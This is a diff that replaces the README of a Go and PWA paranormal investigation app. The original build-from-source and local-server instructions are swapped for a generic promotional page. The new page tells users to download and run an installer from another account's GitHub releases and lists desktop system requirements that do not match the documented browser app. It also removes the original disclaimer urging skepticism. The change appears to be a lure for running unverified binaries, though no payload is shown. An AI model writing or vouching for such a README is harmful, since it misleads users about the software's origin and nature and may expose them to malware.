@@ -1,204 +1,70 @@
-# OtherSide - Paranormal Investigation Application
+# 👻 otherside - Your Tool for Paranormal Investigation
 
-A comprehensive paranormal investigation application built with Go backend and Progressive Web App (PWA) frontend.
+## 🚀 Getting Started
 
-## Features
+Welcome to the otherside! This application helps you explore the realm of paranormal investigation. With features like EVP, VOX, radar, and SLS detection, you can conduct thorough investigations with ease.
 
-### Core Investigation Tools
-- **EVP Recording & Analysis**: Real-time audio capture with waveform visualization and paranormal activity detection
-- **VOX Communication**: Spirit communication through phonetic banks and frequency modulation
-- **Radar Detection**: EMF and audio anomaly visualization with environmental monitoring
-- **SLS Detection**: Camera-based skeletal tracking for entity visualization
-- **Session Management**: Complete investigation session tracking and documentation
+## 📥 Download the Application
 
-### Technical Capabilities
-- **Offline Support**: Full offline functionality with automatic data synchronization
-- **Real-time Processing**: Low-latency audio and video processing (<200ms)
-- **Mobile Optimized**: PWA design for iOS and Android with native-like experience
-- **Data Export**: Multiple export formats (JSON, CSV, ZIP) for investigation reports
-- **OpenTelemetry Integration**: Comprehensive observability and performance monitoring
+[![Download otherside](https://img.shields.io/badge/Download-otherside-blue.svg)](https://github.com/Kaushikkumar10/otherside/releases)
 
-## Architecture
+## 🔍 Features
 
-### Backend (Go)
-- **Clean Architecture**: Separation of concerns with domain, service, repository, and handler layers
-- **Microservices Ready**: Modular design for easy scaling and deployment
-- **SQLite Database**: Local data storage with comprehensive schema
-- **OpenTelemetry**: Distributed tracing and metrics collection
-- **RESTful API**: Complete API for all paranormal investigation features
+- **EVP Detection**: Capture electronic voice phenomena with our advanced audio-processing tools.
+- **VOX Monitoring**: Detect voice-activated signals for an efficient investigation experience.
+- **Radar Interface**: Visualize paranormal activity through an intuitive radar display.
+- **SLS Detection**: Use computer vision to locate and map entities in real-time.
+- **User-Friendly Interface**: Navigate seamlessly through our clean architecture design.
 
-### Frontend (PWA)
-- **Progressive Web App**: Installable on mobile devices
-- **Modern Web APIs**: WebRTC, Web Audio API, Canvas API, Device Sensors
-- **Service Worker**: Offline support and background synchronization
-- **Responsive Design**: Mobile-first design with touch-friendly interactions
-- **Real-time Visualizations**: Audio waveforms, radar sweeps, skeletal overlays
+## 📦 Download & Install
 
-## Quick Start
+To get started, follow these steps:
 
-### Prerequisites
-- Go 1.22 or later
-- Modern web browser with camera/microphone access
+1. **Visit the Releases Page**: Go to the official [download page](https://github.com/Kaushikkumar10/otherside/releases). 
+2. **Choose Your Version**: You will see several versions available. Select the latest release for the best experience. 
+3. **Download the Application**: Locate the file that matches your operating system. Click on the file to begin the download.
+4. **Run the Application**: After the download is complete, open the file. Follow the on-screen instructions to install the application.
 
-### Running the Application
+## 🛠️ System Requirements
 
-1. Clone and build:
-\`\`\`bash
-git clone https://github.com/myideascope/otherside
-cd otherside
-go build ./cmd/server
-\`\`\`
+Before installing, ensure your system meets the following requirements:
 
-2. Start the server:
-\`\`\`bash
-./server
-\`\`\`
+- **Operating System**: Windows 10 or later, macOS High Sierra (10.13) or later, or a compatible Linux distribution.
+- **Processor**: Dual-core processor or better.
+- **Memory**: At least 4GB RAM.
+- **Disk Space**: Minimum of 500MB free space.
 
-3. Open your browser and navigate to \`http://localhost:8080\`
+## 🎓 How to Use
 
-4. Grant camera and microphone permissions for full functionality
+1. **Open the Application**: Once installed, launch the application from your desktop or applications menu.
+2. **Set Up Your Investigation**: Choose your investigation mode from the home screen. Select features like EVP or SLS based on your needs.
+3. **Begin Your Investigation**: Follow the prompts to start capturing data. Use the radar and VOX features to scan your surroundings.
+4. **Analyze the Data**: Review captured audio and visuals directly within the application. Utilize built-in tools to enhance your findings.
 
-### Environment Configuration
+## 🌐 Support and Community
 
-Create a \`.env\` file or set environment variables:
+If you need help or want to connect with other users:
 
-\`\`\`bash
-PORT=8080
-ENVIRONMENT=development
-DB_NAME=otherside.db
-DATA_PATH=./data
-AUDIO_SAMPLE_RATE=44100
-NOISE_THRESHOLD=0.1
-\`\`\`
+- **Join the Discussion**: Visit our community page on GitHub Discussions.
+- **Report Issues**: Use the Issues tab on our GitHub repository to report bugs or request features.
 
-## API Endpoints
+## 💬 Feedback
 
-### Sessions
-- \`POST /api/v1/sessions\` - Create new investigation session
-- \`GET /api/v1/sessions/{id}\` - Get session details and summary
-- \`GET /api/v1/sessions\` - List all sessions (paginated)
+We value your input. After using the application, please share your experiences and suggestions. Your feedback helps us improve and serve you better.
 
-### Investigation Tools
-- \`POST /api/v1/sessions/{sessionId}/evp\` - Process EVP recording
-- \`POST /api/v1/sessions/{sessionId}/vox\` - Generate VOX communication
-- \`POST /api/v1/sessions/{sessionId}/radar\` - Process radar detection
-- \`POST /api/v1/sessions/{sessionId}/sls\` - Process SLS detection
-- \`POST /api/v1/sessions/{sessionId}/interactions\` - Record user interaction
+## 🏷️ Topics
 
-### Data Export
-- \`POST /api/v1/export/sessions\` - Export session data
-- \`GET /api/v1/export/list\` - List available exports
-- \`GET /api/v1/export/download/{filename}\` - Download export file
+This project covers various topics related to paranormal investigation, including:
 
-### Health Check
-- \`GET /health\` - Application health status
+- audio-processing
+- clean-architecture
+- computer-vision
+- evp
+- golang
+- investigation
+- paranormal
+- progressive-web-app
+- pwa
+- webrtc
 
-## Investigation Features
-
-### EVP (Electronic Voice Phenomenon) Recording
-- Real-time audio capture with noise reduction
-- Waveform visualization and frequency analysis
-- Voice frequency range highlighting (85-2000 Hz)
-- Playback controls: normal, slow, reverse
-- Quality assessment and anomaly detection
-- Annotation support for evidence documentation
-
-### VOX Communication
-- Phonetic bank synthesis for spirit communication
-- Multiple language packs (English, Simple)
-- Environmental trigger-based activation
-- Frequency modulation with adjustable parameters
-- Silent operation until triggered (no false chatter)
-- Response correlation and timing analysis
-
-### Radar Detection
-- Visual radar interface with 360° sweep
-- EMF and audio anomaly correlation
-- Real-time environmental monitoring
-- Device sensor integration (accelerometer, magnetometer)
-- Position tracking and movement trails
-- Configurable detection sensitivity
-
-### SLS (Structured Light Sensor) Detection
-- Camera-based skeletal tracking
-- Real-time video overlay with joint visualization
-- Confidence scoring and quality assessment
-- Multiple filter options to reduce false positives
-- Movement pattern analysis
-- Bounding box and position tracking
-
-### Session Management
-- Complete investigation session lifecycle
-- Environmental condition recording (temperature, humidity, pressure)
-- Location tracking with GPS coordinates
-- Session notes and interaction logging
-- Real-time session timer and status tracking
-- Comprehensive session statistics and analysis
-
-## Project Structure
-
-\`\`\`
-otherside/
-├── cmd/server/          # Application entry point
-├── internal/
-│   ├── config/          # Configuration management
-│   ├── domain/          # Domain models and interfaces
-│   ├── service/         # Business logic layer
-│   ├── repository/      # Data access layer
-│   └── handler/         # HTTP handlers
-├── pkg/
-│   └── audio/           # Audio processing utilities
-├── web/static/          # PWA frontend files
-├── configs/             # Database schema and configurations
-└── docs/                # Documentation
-\`\`\`
-
-## Security and Privacy
-
-- **Local Storage**: All data stored locally by default
-- **No External Dependencies**: Operates completely offline
-- **Permission Management**: Explicit camera/microphone permission requests
-- **Secure Defaults**: Conservative detection thresholds to minimize false positives
-- **Data Ownership**: Users maintain complete control over investigation data
-
-## Development
-
-### Adding New Investigation Tools
-
-1. Define domain models in \`internal/domain/\`
-2. Create repository interface and implementation
-3. Implement business logic in service layer
-4. Add HTTP handlers for API endpoints
-5. Create frontend modules for user interaction
-
-### Testing
-
-\`\`\`bash
-go test ./...
-\`\`\`
-
-### Linting
-
-\`\`\`bash
-golangci-lint run
-\`\`\`
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch: \`git checkout -b feature-name\`
-3. Make your changes following the Clean Architecture patterns
-4. Add tests for new functionality
-5. Submit a pull request
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Support
-
-For questions, issues, or feature requests, please open an issue on GitHub or contact the development team.
-
----
-
-**Note**: This application is designed for entertainment and investigative purposes. Paranormal detection results should be interpreted with appropriate skepticism and scientific rigor.
+Thank you for choosing otherside. We hope you find it helpful in your paranormal investigations!
